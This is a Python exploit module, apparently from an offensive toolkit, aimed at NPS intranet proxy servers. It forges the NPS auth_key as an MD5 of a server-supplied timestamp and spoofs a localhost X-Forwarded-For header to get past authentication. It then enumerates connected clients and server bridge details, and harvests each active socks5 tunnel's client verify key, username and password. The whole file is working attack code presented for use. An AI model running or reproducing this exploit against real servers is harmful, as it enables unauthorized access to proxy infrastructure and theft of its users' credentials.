# coding=utf-8
from hashlib import md5
from urllib.parse import urlparse

import requests
from loguru import logger

from hacku import UA


class NpsCrack:
    def __init__(self, target):
        self.tunnelUrl = "{URL}/index/gettunnel"
        self.target = target
        self.timeout = 19
        self.headers = {
            "User-Agent": UA.get_random_user_agent(),
            "X-Forwarded-For": "127.0.0.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        self.params = dict()

    def calc_auth_key(self):
        response = requests.post(f'{self.target}/auth/gettime', headers=self.headers, timeout=self.timeout, verify=False).json()
        t = response['time'] + self.timeout
        key = md5(str(t).encode()).hexdigest()
        self.params = {'auth_key': key, 'timestamp': t}

    def get_nps_info(self):
        if not self.params:
            self.calc_auth_key()
        data = {"search": "", "order": "asc", "offset": "0", "limit": "10"}
        try:
            rjson = requests.post(f'{self.target}/client/list', data=data, headers=self.headers, timeout=self.timeout, verify=False, params=self.params).json()
            total_clients = rjson["total"]
            # write server data
            if "ip" in rjson:
                server_ip = rjson["ip"]
                server_bridge_port = rjson["bridgePort"]
                server_bridge_type = rjson["bridgeType"]
                logger.warning(
                    "NPS server IP:{IP} bridgeport:{BRIDGEPORT} bridgetype:{BRIDGETYPE}.".format(
                        IP=server_ip,
                        BRIDGEPORT=server_bridge_port,
                        BRIDGETYPE=server_bridge_type,
                    )
                )
                write_data = "ServerIP : " + server_ip + "\n"
                write_data += "ServerBridgePort : " + str(server_bridge_port) + "\n"
                write_data += "ServerBridgeType : " + server_bridge_type + "\n"
                logger.info(write_data)
            else:
                logger.info(rjson["rows"])
        except Exception as e:
            logger.error(f"Clients connect failed. {e}")

    def get_tunnel_info(self, type="socks5"):
        data = {"offset": "0", "limit": "100", "type": type, "search": "", "client_id": ""}
        res = list()
        try:
            res_json = requests.post(f'{self.target}/index/gettunnel', data=data, headers=self.headers, timeout=self.timeout, verify=False, params=self.params).json()
            for r in res_json["rows"]:
                if r['Status'] and r['RunStatus'] and r['Client']['Status'] and r['Client']['IsConnect']:
                    res.append({
                        "client_ip": r['Client']['Addr'],
                        "client_key": r['Client']['VerifyKey'],
                        "server_ip": r['ServerIp'] if r['ServerIp'] else urlparse(self.target).netloc,
                        "server_port": r['Port'],
                        "username": r['Client']['Cnf']['U'],
                        "password": r['Client']['Cnf']['P']
                    })
        except Exception as e:
            logger.error(e)
        return res
